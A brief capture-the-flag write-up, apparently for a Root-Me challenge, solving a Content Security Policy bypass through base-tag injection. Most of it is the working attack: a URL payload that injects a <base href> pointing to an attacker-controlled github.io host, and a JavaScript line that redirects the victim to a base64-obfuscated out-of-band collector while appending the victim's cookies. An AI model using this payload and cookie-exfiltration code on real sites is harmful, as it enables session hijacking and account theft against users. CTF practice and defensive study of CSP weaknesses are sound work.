# CSP Bypass - Nonce 2

#

* Escape filtering => .replace function only apply on the first occurence and make the caractère non interpretable by the naviguator.
* Analyse the csp => you can use csp evaluator (online)
* base injection possible

## Difficulties

* host something online => i use github (thanks to minedarku)

## soluce 

* Payload: http://challenge01.root-me.org/web-client/ch62/#<h1><base href="https://hr4fn4gud.github.io">

```js
// scriptjs
window.location=atob("aHR0cHM6Ly9jeGtqeXBqejF3ZzAwMDA4OThrMGdxMzN4bW95eXl5eWIub2FzdC5wcm8vYmVhbQ==").concat("?boo").concat(btoa(document.cookie))
```